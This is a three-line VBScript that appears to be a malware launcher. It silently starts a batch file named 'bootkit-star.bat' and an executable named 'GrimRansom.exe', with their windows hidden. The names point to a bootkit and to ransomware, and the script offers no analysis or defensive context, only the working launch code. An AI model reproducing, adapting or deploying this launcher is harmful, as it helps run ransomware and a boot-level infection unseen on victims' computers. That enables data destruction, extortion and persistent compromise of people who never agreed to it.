Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c bootkit-star.bat", 0, False
WshShell.Run "GrimRansom.exe", 0, False
